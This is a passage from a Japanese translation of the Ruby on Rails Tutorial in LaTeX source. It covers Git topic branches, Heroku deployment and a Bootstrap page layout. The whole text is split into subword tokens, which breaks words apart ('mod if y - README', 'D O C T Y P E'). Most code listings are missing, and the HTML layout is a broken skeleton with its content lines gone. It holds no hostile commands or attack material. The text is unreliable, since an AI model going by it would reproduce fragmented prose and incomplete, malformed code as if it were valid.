▁S w it ch ed ▁to ▁a ▁ new ▁ branch ▁' mod if y - README '
▁* ▁ mod if y - README
▁2 つ目の コマンド ▁(\ ko de { git ▁ branch }) ▁ は 、 すべての ローカル ブランチ を 一覧 表示 します 。 「\ ko de { * }」 は その ブランチ が 現在 使用 中 であることを 表 します 。
▁1 番目の \ ko de { git ▁ checkout ▁- b ▁ mod if y - README } コマンドで 、 ブランチ の 新規作成 と その ブランチ への 切り 替 え が 同時に 行われている ことにご注目ください 。 \ ko de { mod if y - README } ブランチ に 「 * 」 が 付 い ている ことで 、 この ブランチ が 現在 使用 中 であること が 示 されています
▁(\ ref { sec : version _ control } で \ ko de { co } エイリアス を 設定 した 場合は 、\ ko de { git ▁ co ▁- b ▁ mod if y - README } と 入力 することもできます )。
▁詳細については \ href { http :// git - sc m . com / book / en / git - branch ing }{\ emph { Pro ▁ Git } の Git ブランチ } に関する 章 を参照 。
▁ master ブランチ は トピックブランチ で 行った 変更 に 影 響 され ないので 、 たとえ ブランチ 上のコード が \ emph { め ち ゃ く ち ゃ } になって し ま って も 、 master ブランチ を チェック ア ウ ト して トピックブランチ を 削除 すれば 、 い つ でも 変更を 破 棄 する 事 が できます 。
▁ 具 体 的な 方法 については この章 の最後 で説明します 。
▁ ちなみに 、 通常 このような 小さな 変更 のために わざわざ ブランチ を作成する 必要はありません が 、「 よい 習慣 を 形 成 するには 早 すぎる 」 ということ ないので 、 早 い 時 期 から 少し でも 練 習 しておきましょう 。
▁ トピックブランチ を作成 後 、 README の内容 を わかりやすく 書き 換 え てみましょう 。
▁ 著者 の場合 、 デフォルトの R D o c を 編集 するときに は 主 に \ href { http :// d ar ing fi re b all . net / projects / m ar k d own /}{ M ar k d own } という マークアップ 言語 を使用しています 。 拡張子 を \ ko de { . m d } に しておけば 、 GitHub に アップロード したときに 自動的に ドキュメント が き れ い に 整 形 されます 。
▁ 最 初 は 、 Git に 付 属 する \ ko de { m v } コマンド ▁( 注 : ▁ Unix の m v コマンド ではありません ! ) ▁ を使って README の 拡張子 を変更 します 。
▁続いて 、 リスト \ ref { code : new _ read me } の内容 を \ ko de { README . m d } に 入力 します 。
▁ 新しい \ ko de { README } ファイル 「\ ko de { README . m d }」 の内容 。
▁# ▁Ruby ▁on ▁Rails ▁Tutorial : ▁" hello , ▁ world ! "
▁< n >< n > T h is ▁is ▁the ▁ first ▁ application ▁for ▁the < n > [ * Ruby ▁on ▁Rails ▁Tutorial * ]( http :// www . railstutorial . org / )< n > by ▁[ Michael ▁Hartl ]( http :// www . michael hartl . com / ).
▁ 変更 が 終わっ たら 、 ブランチ の 状態 を 確認 してみましょう 。
▁2 ▁ file s ▁ change d , ▁5 ▁in s er tion s ( + ) , ▁2 4 3 ▁ de let ions ( - )
▁ delete ▁ mod e ▁ 100 64 4 ▁ README . rdoc
▁create ▁ mod e ▁ 100 64 4 ▁ README . m d
▁\ ko de { - a } フラグ は 慎 重 に 扱 って ください 。 最後の コミット 後に 新しい ファイル を追加した 場合は 、 まず \ ko de { git ▁ add } を実行して バージョン管理 下 に置く 必要があります 。
▁ コミット メッセージ は \ emph { 現在 形 } かつ \ href { http :// en . w ikipedia . org / wiki / I m per at ive _ m oo d } { 命 令 形 } で 書く ように しましょう ▁( 訳 注 : ▁これは 英語 で 書く 場合 の ルール です 。 日 本 語 であれば 「 〜 を 追加 」 などの 体 言 止 め が よいでしょう )。
▁ Git の モデル は 、 ( 単 一 の パッチ ではなく ) ▁ 一 連 の パッチ として コミット されます 。 そのため 、 コミット メッセージ を 書く ときに は 、 その コミット が 「 何 を した のか 」 と 過 去 形 の 履 歴 スタイル で 書く よりも 「 何 を \ emph { する }」 ための もの な のか を 現在 形 かつ 命 令 形 で 書く 方が 、 後 から 見 返 したときに わかりやすく なります 。
▁さらに 、 現在 形 かつ 命 令 形 で 書い て お け ば 、 Git コマンド 自身 によって 生成される コミット メッセージ とも 時 制 が 整 合 します 。
▁詳細については GitHub に 投 稿 された \ href { https :// github . com / blog / 9 2 6 - sh in y - new - commit - style s } { 最新の コミット 方法 } ▁( 英語 ) ▁ を参照してください 。
▁ ファイルの 変更 が 終わっ たので 、 マ ス ター ブランチ に この 変更を \ emph { マージ ▁( merge ) } ▁ します 。
▁S w it ch ed ▁to ▁ branch ▁' master '
▁ U p d at ing ▁3 4 f 06 b 7 . . 2 c 9 2 b e f
▁F a st ▁for w ar d
▁ README . rdoc ▁| ▁2 4 3 ▁-- ---------------- ---------------- ----------------
▁ README . m d ▁| ▁5 ▁+
▁ Git の 出力 には \ ko de { 3 4 f 06 b 7 } のような 文字列 ▁( ハッシュ ) ▁ が含まれ ている ことがあります 。 Git は これら を リポジトリ の 内部 処理 に 使用 しています 。
▁この 文字列 は 環境 の違い により 上 記 の もの と 少し 異なる かもしれませんが 、 他の 部分 は ほぼ 同じ はずです 。
▁ 変更を マージ した 後 は 、\ ko de { git ▁ branch ▁- d } を実行して トピックブランチ を 削除 すれば 終わり です 。
▁D e let ed ▁ branch ▁ mod if y - README ▁( w as ▁2 c 9 2 b e f ).
▁ トピックブランチ の 削除 は 必 須 ではありません 。 実際 、 トピックブランチ を 削除 せずに そのまま に しておくこと は よく 行 わ れ ています 。
▁ トピックブランチ を 削除 せずに 残 しておけば 、 トピックブランチ と マ ス ター ブランチ を 交 互 に 行 き 来 して 、 き り の 良い 所 で 変更を マージ する 事 が できます 。
▁ 上で 述 べ た ように 、\ ko de { git ▁ branch ▁- D } で トピックブランチ 上の 変更を 破 棄 することもできます 。
▁# ▁これは あ く まで 例 です 。 ブランチ で ミ ス を した 時 以外 は 実行 しないでください 。
▁\ ko de { - d } フラグ と異なり 、\ ko de { - D } フラグ は 変更を マージ して い なくても ブランチ を 削除 してくれます 。
▁\ ko de { README } ファイルの 更新 が 終わっ たので 、 Bitbucket に変更 を プッシュ して 結果 を見てみましょう 。
▁ 既に \ ref { sec : bitbucket } で 一度 プッシュ を 行った ので 、 大 抵 の システム では \ ko de { git ▁ push } を実行する ときに \ ko de { origin ▁ master } を省略 できます 。
▁Ma r k d own d で フォーマット された 改良 版 \ ko de { README } ファイル
▁\ label { fig : new _ read me } }< n >\ end { figure }< n >< n > ▁% ▁ section ▁ version _ control ▁( end )< n >< n > ▁\ section { デプロイ する } ▁% ▁( fold )< n > ▁\ label { sec : de p lo y ing }< n >< n >
▁この 段 階 では ほとんど 空 っ ぽ の Rails アプリケーション しか ありません が 、 本番環境 に デプロイ ▁( de p lo y : ▁ デプロイ ) ▁ し てしまい ましょう 。
▁ アプリケーションの デプロイ は 必 須 ではありません が 、 頻繁に 本番環境 にデプロイする こと によって 、 開発 サ イ ク ル で の 問題 を 早 い 段 階 で 見つけ ることができます 。
▁ 開発環境 のテスト を 繰り返す ば か り で 、 い つ まで も 本番環境 に デプロイ しない ま まだ と 、 アプリケーションを 公開 する ぎ り ぎ り の 時 になって 思 わ ぬ 事 態 に 遭 遇 する 可能性 が 高 まり ます
▁\ emph { Rails チュートリアル } の サンプルアプリケーション では 気 に する必要はありません 。 作り かけ の 恥 ず か しい Web アプリケーションを ネ ッ ト に う っかり 公開 して し ま わ ない だ ろ う か と 心 配 する 方 も い ら っ し ゃ る か と思います が 、 それ を防ぐ ための 方法は い く つ もあります ので ご 安 心 ください 。 \ ref { sec : heroku _ command s } は その 方法 の 1 つ です 。
▁ かつ て は Rails アプリ の 本番 デプロイ は 大 変 な 作業 で した が 、 ここ 数 年 急 速 に 簡単 になって き ており 、 さまざまな 本番環境 を 選択 できるようになりました 。
▁“ Engine ▁X " ▁ と 発 音 します 。
▁ 私 の お 気 に 入 り は Heroku で 、 Rails を含む Ruby ▁Web アプリ 用の ホ ス テ ィ ング プラットフォーム です
▁ Heroku は 、 ソースコード の バージョン管理 に Git を使用し ていれば 、 Rails アプリケーション を簡単に 本番環境 に デプロイ できます
▁( Git を導入し た のは 、 ま さ に この Heroku で 使う ため で もあります 。 まだ Git を インストール していない 方は \ ref { sec : version _ control } を参照してください )。
▁さらに 、 Heroku の free ▁t i er ▁ プ ラ ン には 、 チュートリアル で の 利用 を含む さまざまな 用 途 のための 機能 が 十分 過 ぎ る ほど 備 わ っています 。
▁ 実際 、 本チュートリアル の最初の 2 つの エ デ ィ ション も Heroku に 無料 で ホ ス テ ィ ング して いた のです 。 Heroku に 置 いた チュートリアル は 、 数 百 万 もの リクエストを こ な し ながら 、 1 セ ン ト も 支 払 う 必要はありません で した 。
▁この 章では 、 最初の アプリケーションを Heroku に デプロイ します 。
▁ 作業 内容 の一部 に 少し ば か り 高度な 部分 も 含まれています が 、 今 はすべて を 理解 しておく 必要はありません ので ご 安 心 ください 。 今 大 事 な のは 、 この章 の 終わり まで 手順 を 進め ること で 、 作成した アプリケーションを 実際の Web サービス として デプロイ することです 。
▁< n >< n > ▁\ subsection { Heroku の セットアップ }< n > ▁\ label { sec : heroku _ setup }< n >< n >
▁ Heroku では \ href { http :// www . postgresql . org /}{ PostgreSQL } データベース を使用します ▁( ちなみに 発 音 は ▁“ post - g re s - c u e - e ll ” ▁ で 、 よく “ P o st g re s ” と 略 されます )。 そのため には 、 本番 ▁( production ) ▁ 環境 に \ text tt { p g } ▁gem を インストール して Rails が PostgreSQL と 通 信 できるようにします
▁: \ foo t not e {
▁ 一般的 に 、 開発環境 と 本番環境 は 、 データベース も 含 め て なるべく 同じ に しておく 方が 便利です 。 しかし 本チュートリアルで は 、 教 育 的 見 地 から あえて ローカル では SQLite 、 本番 では PostgreSQL を使用する ようにしています 。
▁詳細については \ ref { sec : sample _ app _ setup } を参照 。
▁ これはリスト \ ref { code : gemfile _ p g _ gem } で使用されていま した 。
▁\ ko de { bundle ▁install } に 特殊な フラグ 「 - - with out ▁ production 」 を追加する と 、 本番 用の gem ▁( この場合は \ text tt { p g } と \ text tt { rails \_ 12 factor }) ▁ は ローカル の 環境 には インストール されません 。
▁ 以下 を実行して 変更を コミット できます 。
▁次に Heroku の アカウント を 新規作成 して 設定 します 。
▁最初に \ href { http :// api . heroku . com / signup } { Heroku で ユーザー登録 } します 。
▁続いて 、 自分の システム に Heroku コマンドライン クライアント が インストール されている かどうかを確認 します 。
▁ クラウド IDE を お 使い の場合は 、 Heroku のバージョン 番号 と とも に \ ko de { heroku } ▁C L I が 利用 可能 である という メッセージ が表示されます 。 クラウド IDE を使用して い ない場合は 、\ href { https :// to ol b e lt . heroku . com /}{ Heroku ▁ To ol b e lt } を インストール する必要があります
▁ Heroku の コマンドライン インターフェイス ▁( C L I ) ▁ が インストール されている ことが 確認 できた ら 、 いよいよ \ ko de { heroku } コマンドで ログイン して S S H キー を追加します 。
▁最後に \ ko de { heroku ▁create } コマンド を実行して 、 Heroku サーバー に サンプルアプリケーションの 実行 場所 を作成します ▁( リスト \ ref { code : heroku _ create })。
▁ Heroku に 新しい アプリケーション を作成する 。
▁ Git ▁ remote ▁ heroku ▁ add ed
▁この \ ko de { heroku } コマンド を実行すると 、 Rails アプリケーション 専 用の サブ ドメイン が作成され 、 ただ ち に ブラウザで 表示 可能 になります 。
▁ 今 はまだ 何も ありません が 、 すぐ に デプロイ して Web ページを 表示 させ ましょう 。
▁< n >< n > ▁\ subsection { Heroku にデプロイする ▁ (1) }< n > ▁\ label { sec : heroku _ st e p _ one }< n >< n >
▁Rails アプリケーションを 実際に Heroku にデプロイする には 、 まず Git を使用して Heroku に リポジトリ を プッシュ します 。
▁$ ▁git ▁ push ▁ heroku
▁( 警 告 メッセージ が 若 干 表示される ことがあります が 、 今 は 無視 してください 。
▁ 詳 しく は \ ref { sec : pro f ess ion al _ gra de _ de p lo y m ent } で 解説します )。
▁ 失 礼 、 その 2 はありません 。
▁以上で お し ま い です 。
▁ デプロイ された アプリケーションの 表示 は 、\ ko de { heroku ▁create } ▁( リスト \ ref { code : heroku _ create }) ▁ を実行し た 際に 生成された アドレス を ブラウザで 開 く だけです ▁( もちろん ここに 表示 されている 著者 の アドレス ではなく 、 あなた の アドレス を使って ください )。
▁ クラウド IDE ではなく ローカル コンピュータ で 作業 している 場合は 、\ ko de { heroku ▁ o p en } コマンドで ブラウザ 表示 することもできます 。
▁ 実行 結果を 図 \ ref { fig : heroku _ app } に示します 。
▁ ページ の内容 は 図 \ ref { fig : hello _ world _ hello _ app } と まったく 同じです が 、 今 や それ が イン ター ネ ッ ト 上の 本番 Web ページ として 堂 々 と 公開 されている のです 。
▁ Heroku 上で 動 い ている 最初の Rails チュートリアル アプリケーション 。
▁\ href { http :// de v center . heroku . com / heroku - command } { Heroku の コマンド } は たくさん あるので 、 ここでは 簡単に 触 れる 程 度 に と ど め ます が 、 少し だけ 使って みましょう 。
▁ アプリケーションの 名前 を変更 してみます 。
▁ 注意 : ▁この 名前 は 、 著者 の サンプルアプリケーション で 既に 使用 しています ので 、「 必ず 他の 名前 を使用して ください 」 。
▁ 実際 は 、 Heroku で 生成された デフォルトの アドレス でも 十分 です 。
▁ 本当に アプリケーションの 名前 を 変え て み たい場合は 、 次のような ランダム な サブ ドメイン 名を 設定 し 、 この章 の 冒 頭 で説明した アプリケーションの セキュリティ を 実装 してみる 方法 もあります 。
▁ h w p c b m z e . heroku app . com < n > s e y j h f lo . heroku app . com < n > j h y i ce v g . heroku app . com
▁ このような で たら め の サブ ドメイン 名 なら 、 URL を 教 え ない 限 り サイト にアクセス される 心 配 も ありません 。
▁( ちなみに 、 Ruby の 威 力 の 一 端 を お 見 せ するために 、 ランダム な サブ ドメイン 名 を生成する ための コ ン パ ク ト な コードを 以下 に 記 します 。
▁ 最 高 です ね 。 )
▁ Heroku では 、 サブ ドメイン の 他 に 独 自 ドメイン も 使用できます
▁( 実 を 言 う と 、 この \ href { http :// www . railstutorial . org } { Ruby ▁on ▁Rails チュートリアル Web サイト } も Heroku 上 に置かれ ています 。 本チュートリアル を オンライン で 読んで いる のであれば 、 ま さ に Heroku に ホ ス テ ィ ング された Web サイト を見 ている という ことになります )。
▁S e e ▁the ▁\ href { http :// de v center . heroku . com /}{ Heroku ▁ document ation } ▁for ▁more ▁ information ▁ about ▁ custom ▁do main s ▁and ▁ other ▁ Heroku ▁to p i c s .
▁この 章では インストール 、 開発環境 の設定 、 バージョン管理 、 本番環境 への デプロイ など 、 多くの 課題 を 達 成 しました 。
▁ 次の 章では 、 この 第 \ ref { cha : beginning } 章 で 学 んだ ことを 基 礎 として 、 データベース を 備 え た \ emph { toy アプリ } を 製 作 し 、 Rails で どんな ことができる か を さらに 詳 しく 学 び ます 。
▁ ここ まで の 進 捗 を Twitter に 投 稿 したり F a ce book で 誰 か に 知 ら せ たい場合は 、 以下の リンクを お 使い ください 。
▁Ruby ▁on ▁Rails を 学習 中 !
▁ } . < n >< n >\ subsection { 本 章 の まとめ } ▁% ▁( fold )< n >\ label { sec : beginning _ what _ w e _ learn ed _ in _ this _ chapter }< n >< n >\ begin { item ize }< n >< n >\ item
▁Ruby ▁on ▁Rails とは 、 Web 開発 のための フレームワーク であり 、 Ruby プログラミング 言語 によって 記述 されている 。
▁ 事 前 設定 済み の クラウド 環境 を 利用 することで 、 Rails の インストール 、 アプリケーションの 生成 、 生成された ファイルの 編集 を簡単に 行う ことができる 。
▁ コントローラのアクション を追加した り 、 ルート ルーティング を変更 したり する だけで 「 hello , ▁ world 」 アプリケーション を作成 できる 。
▁ Git による バージョン管理 を導入し 、 Bitbucket の 非 公開 リポジトリ に プッシュ する 理由 は 、 データ の 喪 失 を 防止 し 、 他の 開発者 と の 共 同 作業 を 行える ように する ため 。
▁作成した アプリケーションを Heroku の 本番環境 に デプロイ した 。
▁リスト \ ref { code : hello _ action } の \ ko de { hello } アクション を 書き 換 え 、「 Hello , ▁ world ! 」 の代わりに 「 h ol a , ▁ m un do ! 」 と 表示される ように してみましょう 。
▁\ emph { 課 外 作業 } : ▁Rails の 表示 では 「 非 \ href { http :// es . w ikipedia . org / wiki / A S C I I } { A S C I I } 文字 」 も サポート されています 。 ス ペ イン 語 特 有 の 逆 さ 感 嘆 符 「 ¡ 」 を含む 「 ¡ H ol a , ▁ m un do ! 」 を表示し てみましょう ▁( 図 \ ref { fig : h ol a _ m un do })
▁ 利用 している エディタ によって は 「 invalid ▁ m ulti by te ▁ cha r a c ter 」 などの エラーメッセージ が表示され ること がある かもしれませんが 、 気 にする ことはありません 。
▁この メッセージ を表示し たくない のであれば 、\ href { http :// l m g t f y . com / ? q = invalid + m ulti by te + cha r a c ter } { エラーメッセージ を グ グ って } 対応 してください 。
▁リスト \ ref { code : hello _ action } の \ ko de { hello } アクション を 複 製 して 、 第 2 の アクション \ ko de { g oo d by e } を追加しましょう 。 この アクション は 、「 g oo d by e , ▁ world ! 」 という テキスト を表示します 。
▁リスト \ ref { code : hello _ root _ route } の ルーティング を 編集 して 、 ルート ルーティング の 割り当て 先 を \ ko de { hello } アクション から \ ko de { g oo d by e } アクション に変更 します ▁( 図 \ ref { fig : g oo d by e _ world })。
▁ ルート ルーティング で 「 ¡ H ol a , ▁ m un do ! 」 を表示する よう 変更 する 。
▁ ルート ルーティング で 「 g oo d by e , ▁ world ! 」 を表示する よう 変更 する 。
▁ beginning
▁なお 、 演習 と チュートリアル 本 編 の 食 い 違 い を避ける 方法 については 、 演習 用の トピックブランチ に追加 した メ モ ▁(\ ref { sec : static _ pages _ exercises }) ▁ を 参 考 に してください 。
▁\ emph { 注 } : ▁ 『 \ emph { 演習 の 解 答 マ ニ ュ ア ル } ▁( 英語 ) 』 には \ emph { Ruby ▁on ▁Rails チュートリアル } の すべての 演習 の 解 答 が 掲 載 され ており 、\ href { http :// www . railstutorial . org /}{ www . railstutorial . org } で 原 著 を 購 入 い ただ いた 方 には 無料 で 配 布 しています ▁( 訳 注 : ▁ 解 答 は 英語 です )。
▁\ href { https :// t w it ter . com / c ol m t u it e } { Co l m ▁ T u it e } の 多 大 な 貢 献 により 、 サンプルアプリケーション を Bootstrap ▁ CSS の フレームワーク に変換 すること が できました 。 感 謝 します 。
▁ 章 の 最後に 、 ユーザーを サイトに ログイン させる ための 重要な 一 歩 を 踏 み 出 します ▁(\ ref { sec : user _ signup })。
▁この 結果 、 本 章では テキストエディタ による 修正 と ブラウザ による 確認 が ほとんど になります 。 テスト駆動開発 で 進め る 唯 一 の 箇所 は 、\ ref { sec : contact _ page } の Contact ページの 追加 する 箇所 のみ です 。
▁最後に 、 新しい テスト 手法 「 ▁ 統合テスト ▁(\ emph { In te gra tion ▁ Test } )」 について 紹 介 します ▁(\ ref { sec : layout _ link _ tests })。 統合テスト を使って 、 最終的な レイアウト や リンク が 正しい かどうかをチェックし ます 。
▁< n >< n > ▁\ section { 構造 を追加する } ▁% ▁( fold )< n > ▁\ label { sec : structure }< n >< n >
▁\ emph { Rails チュートリアル } は Web 開発 のための 本 であり 、 Web デザイン の 本 ではありません が 、 だ から と い って \ emph { 何 の スタイル も ない } 寒 々 しい 外 観 の アプリケーションで い つ まで も 作業 を 続けて いる と 憂鬱 になってしまい ます 。 そこで 、 この章 では レイアウト に いくつかの 構造 と CSS を与えて 最 小 限 の スタイル を追加します 。 カスタム CSS ルール の 他 に 、 Twitter 社 による オープン ソース の Web デザイン フレームワーク である \ href { http :// get bootstrap . com /}{ \ emph { Bootstrap } } を 利用 します 。
▁また 、\ emph { コード } そのもの にも スタイル を 与え ます 。 つまり 、 散 ら か り は じ め た コード レイアウト を \ emph { パーシャル } を使用して 整 え る ということです 。
▁ 本書 の 残 り では 、\ emph { モックアップ } ▁( Web の 文 脈 では よく ▁\ emph { ワ イ ヤ ー フ レ ー ム } と 呼ばれ ます ) ▁という 、 最終的な アプリケーションの 外 観 を 示す 一 種 の ラ フ ス ケ ッ チ を使用する ことにします
▁\ emph { Ruby ▁on ▁Rails チュートリアル } ▁ のモックアップ は 、 「\ href { http :// g o m ock ing b ir d . com } { M ock ing b ir d }」 という 素晴らしい モックアップ 作成 サービス で 作 られ ています 。
▁この 章では 、 ▁ 主 に \ ref { sec : static _ pages } で紹介した サイト ロ ゴ 、 ナビゲーション ヘッダー 、 サイト フ ッ ター を含む 静的ページ を 開発 します 。
▁これらの ページ の中で 最も 重要な 、 Home ページのモックアップ を 図 \ ref { fig : home _ page _ mockup } に示します 。
▁ モックアップ に基いて 作成した 最 終 結果 は 図 \ ref { fig : site _ with _ footer } で 確認 することができます 。
▁ 両者 を見 比 べ ると 、 細 部 が 若 干 異なる ことに 気 が 付 く でしょう ▁( たとえば 、 実際には 最後に Rails の ロ ゴ を ページ に追加します )。 しかし モックアップ は 正 確 である 必要はありません ので 、 これ で 十分 です 。
▁ サンプルアプリケーションの Home ページのモックアップ
▁ Git で バージョン管理 を している のであれば 、 これまで と同様 、 この時点で 新しい ブランチ を作成する の が よいでしょう 。
▁この 更新 には 、 領 域 ▁( div タグ ) ▁ の 追加 、 CSS クラスの 追加 、 サイト ナビゲーション の 起 点 となる 領 域 の 追加 も 含 まれ ます 。
▁ 完全な ファイルを リスト \ ref { code : layout _ new _ structure } に示します 。 続いて 、 これを 構成 している 多くの 部品 について解説します 。
▁ 表示 結果を 今 すぐ 確認 したい のであれば 、 図 \ ref { fig : layout _ no _ log o _ or _ custom _ css } で 確認 できます
▁(\ emph { 注 : } この時点で は わざわざ 見 に 行 く ほど の 仕 上 が り ではありません が )。
▁ 構造 を追加した Web サイトの レイアウト
▁D O C T Y P E ▁ html >
▁< html >
▁< head >
▁< ! - - [ if ▁ lt ▁I E ▁ 9 ] >
▁< ! [ end if ]
▁</ head >
▁< body >
▁< n a v >
▁</ ul >
▁</ n a v >
▁</ header >
▁</ body >
▁</ html >
▁それでは 、 リスト \ ref { code : layout _ new _ structure } の 新しい 要素 を 上 から 順に 見 て い き ましょう 。
▁\ emph { sh im } と \ emph { sh i v } という 単 語 は 、 今回の 用 途 では どちら でも 大 丈 夫 です 。 sh im を 意味 は 「 洗 う 機 械 、 も しく は 薄 い 物 質 を 整 理 し フ ィ ッ ト させる ための モ ノ 、 あるいは 服 を削除する こと 」 なので 、 意味 合 い として は 前 者 が 正しい です 。 ちなみに 後 者 は 「 ナ イ フ 、 も しく は 武 器 として 使う 剃刀 」 という 意味 なので 、 おそらく 原 著者 である ▁S j o er d ▁ V is sc her の ち ょ っ と した イ タ ズ ラ 心 でしょう 。
▁上のコード には 、 以下のような 奇 妙 な 構 文 が 含まれています 。
▁これは 、 M i c r o s of t ▁ In ter net ▁ E x p l or er ▁( I E ) ▁ のバージョン が 9 より 小 さ い 場合 ▁(\ ko de { if ▁ lt ▁I E ▁ 9 }) ▁ に のみ 、 囲 まれ ている 行 を実行します 。
▁この 風 変 わ り な 文法 \ ko de { ▁[ if ▁ lt ▁I E ▁ 9 ]} ▁ は 、 Rails の一部 \ emph { ではありません } 。 これは 実は 、\ href { http :// en . w ikipedia . org / wiki / Co n d i tion al _ comment } { 条件 付き コメント } と呼ばれる もの で 、 今回の ような 状 況 のために In ter net ▁ E x p l or er で 特 別 に サポート されています 。
▁これにより 、 Firefox 、 C h r o me 、 S a fa ri などの 他の ブラウザ に 影 響 を 与え ずに 、 I E のバージョン が 9 未 満 の 場合に \ emph { のみ } HTML 5 ▁ sh im を インクルード する ことができる ため 、 非常に 好 都 合 です 。
▁ それ に 続 く セクション には 、 サイトの ロ ゴ を表示する \ ko de { header } 、 ( \ ko de { div } タグ による ) ▁ いくつかの 領 域 、 ナビゲーション リンク の リスト があります 。
▁\ ko de { header } タグ は 、 ページの ト ッ プ に 来 る べ き 要素 を表し ます 。
▁ CSS クラス は 、 Ruby の クラス とは まったく 関係 が ありません 。
▁ すべての HTML 要素 には 、 クラス と \ emph { id } の 両方 を指定する ことができます 。 これらは 単なる ラ ベ ル で 、 CSS で スタイル を指定する ときに 便利です ▁(\ ref { sec : custom _ css })。
▁ クラス と ID の 主 な 違 い は 、 クラス は ページ の中で 何 度 でも 使用できる の に 対 し 、 ID は 一度 しか 使用する ことができ ない 点 です 。
▁ 今回の 場合 、 すべての n a v bar クラス には 、\ ref { sec : custom _ css } で インストール する Bootstrap フレームワーク によって 特別な 意味 が与えられ ます 。
▁\ ko de { header } タグ の 内 側 には 2 つの \ ko de { div } タグ があります 。
▁\ ko de { div } タグ は 一般的な 表示 領 域 を表し 、 ドキュメント を 別 々 の パ ー ツ に 分 け る 以外の ことは しません 。
▁ 古 い スタイル の HTML では 、\ ko de { div } タグ は サイトの ほぼ すべての 領 域 に 使用されます が 、 HTML 5 では 多くの アプリケーションに 共通 の 領 域 で使用する \ ko de { header } 要素 、\ ko de { n a v } 要素 、\ ko de { section } 要素 が追加され ています 。
▁ この場合 、\ ko de { div } タグ にも CSS クラス ▁(\ ko de { con t a in er }) ▁ が与えられ ています 。
▁\ ko de { header } タグ の クラス と同様に 、 この クラス も Bootstrap において 特別な 意味 を 持 っています 。
▁ div に 続いて 、 埋め込み Ruby コードが 出 現 します 。
▁ 第 3 引数 は オプション ハッシュ で 、 この場合は サンプル アプリ の リンク で CSS の id ▁\ ko de { log o } を指定して います
▁( 他の 3 つの リンク には オプション ハッシュ が 指定 されていません が 、 必 須 では ないので 構 いません )。
▁Rails ヘルパーは 、 この ように オプション の ハッシュ を 取 ること が よく あり 、 これにより Rails のコード から 離 れ ること なく 任意の HTML オプションを 柔 軟 に追加 することができます 。
▁ div の 内 側 の 2 番目の 要素 は 、\ emph { リスト ア イ テ ム } タグ \ ko de { li } と \ emph { 順 不 同 リスト } タグ \ ko de { ul } によって 作 られ た 、 ナビゲーション リンク の リスト です 。
▁ 正 確 には ここでは 不要な のですが 、\ ko de { n a v } タグ には 「 その 内 側 が ナビゲーション リンク である 」 という 意 図 を 明示的に 伝 え る 役 割 があります 。
▁さらに 、\ ko de { ul } タグ に 付 与 されている \ ko de { n a v } や \ ko de { n a v bar - n a v }、\ ko de { n a v bar - right } クラス も Bootstrap において 特別な 意味 を 持 ち ます 。 したがって 、\ ref { sec : custom _ css } で Bootstrap の CSS を追加した ときに 、 これらの スタイル も 自動的に 適 用 されます 。
▁ ブラウザから ソース を見 ること で 確認 が できます が 、 Rails が 埋め込み Ruby を 評価 し 、 レイアウト を 描画 すると 、 上の リスト は 以下のように 置 き 換 わ ります
▁ スペース を 入 れる と 見 栄 え が 変わる かもしれませんが 、\ ref { sec : testing _ title s } で 触 れ た ように HTML は 重複 する 空白 を 無視 する ので どちら でも 大 丈 夫 です 。
▁これ が ブラウザ に 返される HTML になります 。
▁ レイアウト の 最後の 部分 は 、 メ イン コンテンツ 用の \ ko de { div } です 。
▁ 上 と同様 、\ ko de { con t a in er } クラス も Bootstrap において 特別な 意味 を 持 ち ます 。
▁\ ref { sec : layouts _ and _ e m b ed de d _ ruby } で 学 んだ ように 、\ ko de { yield } メソッドは Web サイトの レイアウト に ページ ご と の内容 を 挿 入 します 。
▁\ ref { sec : partial s } で 追加 する サイト フ ッ ター を 除 いて 、 これ で レイアウト は 完成 しました 。 Home ページ へ アクセス して 表示 結果を 確認 することができます 。
▁ 今後 の スタイル 要素 を 利用 するために 、
▁ サインアップ ページ へのリンク がある Home ページ
▁This ▁is ▁the ▁ home ▁ page ▁for ▁the
▁ sample ▁ application .
▁</ h 2 >
▁ 第 \ ref { cha : sign _ up } 章 で サイトに ユーザー を追加する ときに 備 え て 、 最初の \ ko de { link \_ to } に 仮 の リンク を作成します 。
▁ 上で 挙 げ た \ ko de { div } タグ の CSS クラス \ ko de { j um b o tr on } や 、 signup ボタン の \ ko de { b t n } クラス 、\ ko de { b t n - l g } クラス 、\ ko de { b t n - primary } クラス はすべて 、 Bootstrap において 特別な 意味 を 持 ち ます 。
▁2 番目の \ ko de { link \_ to } では 、 引数として 画像 ファイルの パス と 任意の オプション ハッシュ を と る \ ko de { image \_ tag } ヘルパー の 能 力 が 示 されています 。 シンボル を使用して 、 この場合は \ ko de { alt } 属性を 設定 しています 。
▁ Cloud ▁ IDE や Unix 系 の OS ▁( M a x ▁ OS ▁X など ) ▁ を 使っている 場合は 、 次のように \ ko de { c url } コマンドで 簡単に 取得 できます
▁ も し OS ▁X の \ href { http :// br e w . sh /}{ Home br e w } が 使えるように な っ ていれば 、\ ko de { br e w ▁install ▁c url } という コマンド を 打 って \ ko de { c url } を インストール することができます 。
▁ Cloud ▁ IDE を 使っている と 、 ( 筆者 にも 理由 は 分 から ない のですが ) ▁ とき ど き 2 行 目 の m v コマンドで 失敗 すること がある よう です 。 その 場合は 、 1 行 目 の \ ko de { c url } コマンド を もう一度 実行 して 、 ロ ゴ 画像 が正しく ダウンロード でき ている かどうか 確認 してください
▁(\ ko de { c url } コマンド の詳細については 、\ href { http :// con que r ing the command line . com / book / c url }{\ emph { Co n que r ing ▁the ▁ Co m m and ▁ L in e } という 本 の 第 3 章 } ▁( 英語 ) ▁ を参照してください ) ▁ 。
▁リスト \ ref { code : signup _ button } で ▁\ ko de { image \_ tag } ヘルパー を 使っている ので 、 Rails は 該当する 画像 ファイルを 、 アセットパイプライン を通して \ ko de { app / assets / images / } ディレクトリ の中から 探 してくれます ▁( アセットパイプライン については \ ref { sec : sass _ and _ the _ asset _ pipeline } で説明します )。
▁\ ko de { image \_ tag } の 効果 を 確かめ るために 、 ブラウザから 生成された HTML を見てみましょう
▁この 書 式 に従う タグ は \ emph { 閉 じ タグ } として 知 られ ています 。
▁ ファイル名 が 重 なら ないように するために 、 Rails が \ ko de { 9 30 8 b 8 f 9 2 f e a 4 c 19 a 3 a 0 d 8 3 8 5 b 4 9 4 5 2 6 } という 文字列 ▁( 実際の 文字列 は システム ごとに 異なります ) ▁ を追加し ている ことがわかります 。 これは 、 たとえば 画像 ファイルを 新しい 画像 に 更新 したときに 、 ブラウザ 内に 保存 された キャッシュ に 意 図 的に ヒ ッ ト させ ないように するための 仕組み です 。
